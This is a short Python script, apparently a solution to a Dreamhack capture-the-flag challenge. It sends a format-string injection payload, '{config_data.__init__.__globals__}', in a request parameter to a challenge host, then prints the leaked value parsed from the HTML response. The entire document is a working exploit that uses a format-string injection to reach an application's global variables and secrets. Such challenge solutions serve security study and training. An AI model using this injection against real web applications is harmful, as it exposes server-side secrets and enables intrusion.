from utils import verify

from httpx import get
from bs4 import BeautifulSoup

v = verify
a = get("http://host3.dreamhack.games:8539", params={"body": "{config_data.__init__.__globals__}"})
if a.is_error:
  exit(1)
val = v(v(BeautifulSoup(a.text, features='lxml'), 'body'), 'strong').get_text()
print(val)
